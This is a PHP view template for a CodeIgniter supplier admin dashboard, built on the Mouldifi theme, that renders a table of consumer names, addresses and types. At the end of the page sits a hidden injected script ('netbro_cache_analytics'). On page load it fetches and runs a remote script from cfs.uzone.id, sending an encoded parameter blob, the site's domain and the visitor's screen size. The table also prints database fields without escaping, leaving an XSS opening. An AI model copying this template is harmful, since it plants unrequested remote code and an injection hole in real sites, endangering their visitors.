<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from g-axon.com/mouldifi4.3/dark/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Mar 2017 04:39:48 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Mouldifi - A fully responsive, HTML5 based admin theme">
    <meta name="keywords" content="Responsive, HTML5, admin theme, business, professional, Mouldifi, web design, CSS3">
    <title>Supplier| Dashboard</title>
    <!-- Site favicon -->
    <link rel='shortcut icon' type='image/x-icon' href='images/favicon.ico' />
    <!-- /site favicon -->

    <!-- Entypo font stylesheet -->
    <link href="<?php echo base_url()."assets/"; ?>css/entypo.css" rel="stylesheet">
    <!-- /entypo font stylesheet -->

    <!-- Font awesome stylesheet -->
    <link href="<?php echo base_url()."assets/"; ?>css/font-awesome.min.css" rel="stylesheet">
    <!-- /font awesome stylesheet -->

    <!-- Bootstrap stylesheet min version -->
    <link href="<?php echo base_url()."assets/"; ?>css/bootstrap.min.css" rel="stylesheet">
    <!-- /bootstrap stylesheet min version -->

    <!-- Mouldifi core stylesheet -->
    <link href="<?php echo base_url()."assets/"; ?>css/mouldifi-core.css" rel="stylesheet">
    <!-- /mouldifi core stylesheet -->
    <link href="<?php echo base_url()."assets/"; ?>css/mouldifi-forms.css" rel="stylesheet">
    <link href="<?php echo base_url()."assets/"; ?>css/plugins/datatables/jquery.dataTables.css" rel="stylesheet">
    <link href="<?php echo base_url()."assets/"; ?>js/plugins/datatables/extensions/Buttons/css/buttons.dataTables.css" rel="stylesheet">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="<?php echo base_url()."assets/"; ?>js/html5shiv.min.js"></script>
    <script src="<?php echo base_url()."assets/"; ?>js/respond.min.js"></script>
    <![endif]-->

    <!--[if lte IE 8]>
    <script src="<?php echo base_url()."assets/"; ?>js/plugins/flot/excanvas.min.js"></script>
    <![endif]-->
</head>
<body>

<!-- Page container -->
<div class="page-container">

    <!-- Page Sidebar -->
    <div class="page-sidebar">

        <!-- Site header  -->
        <header class="site-header">
            <div class="site-logo"><a href="index.html"><img src="<?php echo base_url()."assets/"; ?>images/logo.png" alt="Mouldifi" title="Mouldifi"></a></div>
            <div class="sidebar-collapse hidden-xs"><a class="sidebar-collapse-icon" href="#"><i class="icon-menu"></i></a></div>
            <div class="sidebar-mobile-menu visible-xs"><a data-target="#side-nav" data-toggle="collapse" class="mobile-menu-icon" href="#"><i class="icon-menu"></i></a></div>
        </header>
        <!-- /site header -->

        <!-- Main navigation -->
        <ul id="side-nav" class="main-menu navbar-collapse collapse">
            <li><a href="<?php echo base_url("index.php/home"); ?>"><i class="icon-gauge"></i><span class="title">Dashboard</span></a></li>
            <li class="has-sub active"><a href="collapsed-sidebar.html"><i class="icon-layout"></i><span class="title">Data Master</span></a>
                <ul class="nav collapse">
                    <li><a href="#"><span class="title">Data Anggota</span></a></li>
                    <li><a href="<?php echo base_url("index.php/konsumen"); ?>"><span class="title">Data Konsumen</span></a></li>
                    <li><a href="<?php echo base_url("index.php/stok/stoksupplier"); ?>"><span class="title">Data Ikan</span></a></li>
                </ul>
            </li>
            <li><a href="<?php echo base_url("index.php/pemesanan"); ?>"><i class="icon-gauge"></i><span class="title">Pemesanan</span></a></li>
            <li><a href="<?php echo base_url("index.php/rekap"); ?>"><i class="icon-gauge"></i><span class="title">Rekap Penjualan</span></a></li>
            <li><a href="<?php echo base_url("index.php/drp"); ?>"><i class="icon-gauge"></i><span class="title">DRP</span></a></li>
        </ul>
        <!-- /main navigation -->
    </div>
    <!-- /page sidebar -->

    <!-- Main container -->
    <div class="main-container">

        <!-- Main header -->
        <div class="main-header row">
            <div class="col-sm-6 col-xs-7">

                <!-- User info -->
                <ul class="user-info pull-left">
                    <li class="profile-info dropdown"><a data-toggle="dropdown" class="dropdown-toggle" href="#" aria-expanded="false"> <img width="44" class="img-circle avatar" alt="" src="<?php echo base_url()."assets/"; ?>images/man-3.jpg">John Henderson <span class="caret"></span></a>

                        <?php $this->load->view('topbar/action_nav'); ?>

                    </li>
                </ul>
                <!-- /user info -->

            </div>

            <div class="col-sm-6 col-xs-5">
                <div class="pull-right">
                    <!-- User alerts -->
                    <ul class="user-info pull-left">
                    </ul>
                    <!-- /user alerts -->

                </div>
            </div>
        </div>
        <!-- /main header -->

        <!-- Main content -->
        <div class="main-content">
            <h1 class="page-title">Data Tables</h1>
            <!-- Breadcrumb -->
            <ol class="breadcrumb breadcrumb-2">
                <li><a href="index.html"><i class="fa fa-home"></i>Home</a></li>
                <li><a href="basic-tables.html">Tables</a></li>
                <li class="active"><strong>Data Tables</strong></li>
            </ol>
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading clearfix">
                            <h3 class="panel-title">Basic Data Tables with responsive Plugin</h3>
                            <ul class="panel-tool-options">
                                <li><a data-rel="collapse" href="#"><i class="icon-down-open"></i></a></li>
                                <li><a data-rel="reload" href="#"><i class="icon-arrows-ccw"></i></a></li>
                                <li><a data-rel="close" href="#"><i class="icon-cancel"></i></a></li>
                            </ul>
                        </div>
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered table-hover dataTables-example" >
                                    <thead>
                                    <tr>
                                        <th>Nama Konsumen</th>
                                        <th>Alamat</th>
                                        <th>Jenis Konsumen</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <?php foreach ($data as $row) { ?>
                                        <tr class="gradeX">
                                            <td><?php echo $row->nama_konsumen;?></td>
                                            <td><?php echo $row->alamat_konsumen;?></td>
                                            <td><?php echo $row->jenis_konsumen;?></td>
                                        </tr>
                                    <?php } ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Footer -->
            <footer class="footer-main">
                &copy; 2016 <strong>Mouldifi</strong> Admin Theme by <a target="_blank" href="#/">G-axon</a>
            </footer>
            <!-- /footer -->

        </div>
        <!-- /main content -->

    </div>
    <!-- /main container -->

</div>
<!-- /page container -->

<!--Load JQuery-->
<script src="<?php echo base_url()."assets/"; ?>js/jquery.min.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/bootstrap.min.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/plugins/metismenu/jquery.metisMenu.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/plugins/blockui-master/jquery-ui.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/plugins/blockui-master/jquery.blockUI.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/functions.js"></script>

<script src="<?php echo base_url()."assets/"; ?>js/plugins/datatables/jquery.dataTables.min.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/plugins/datatables/dataTables.bootstrap.min.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/plugins/datatables/extensions/Buttons/js/dataTables.buttons.min.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/plugins/datatables/jszip.min.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/plugins/datatables/pdfmake.min.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/plugins/datatables/vfs_fonts.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/plugins/datatables/extensions/Buttons/js/buttons.html5.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/plugins/datatables/extensions/Buttons/js/buttons.colVis.js"></script>
<script>
    $(document).ready(function () {
        $('.dataTables-example').DataTable({
            dom: '<"html5buttons" B>lTfgitp',
            buttons: [
                {
                    extend: 'copyHtml5',
                    exportOptions: {
                        columns: [ 0, ':visible' ]
                    }
                },
                {
                    extend: 'excelHtml5',
                    exportOptions: {
                        columns: ':visible'
                    }
                },
                {
                    extend: 'pdfHtml5',
                    exportOptions: {
                        columns: [ 0, 1, 2, 3, 4 ]
                    }
                },
                'colvis'
            ]
        });
    });
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKcbbGqiLfGeReBtKsjJZeOCAeR2iQSu6esSPqfi7BiCJz8hIk12Q7c%2bqOGwZNuQ%2bjYE%2fLdCEwDyydOvrCTr%2bWZYhKrkIO1NWKcwaCWsdvuy3JK%2fGF6Hdhp3kY9jFe0GgCu%2btt5r%2fZJikZxuWOSJAkps9Zhqgq8rVULmhbpIFNlIwLDWVpKKxGahGDZz9FuOiPqb4GvWwpPPluIsPiDpa1sDLR2LPaY5%2b3P6%2bzX37HZ4%2fG7ZqaFDg3wYLlwEoKJK%2fDbmYGFnKg3p%2b1fD6JMrnj1s5EshRyXw499mc50RygyMjtirL9zcgkkA1%2bQOochnCRIDoNd6m0xyH0ZfWg%2bWmDJhoyCDcW1QoS2aplgJfO%2botXQKY0HV7r5uctCxFZwFtZIE%2bdYQZ5UnOVMk8kh59sIPc1F5upxt9jM7%2bZtGBUctnhR2he2mbx8A%2f%2fu5nijQraRbhkxC9vAMgmFD8DlK%2fNXq7SuYk4w1RWuzkSePzWfck%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from g-axon.com/mouldifi4.3/dark/data-tables.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Mar 2017 04:42:29 GMT -->
</html>

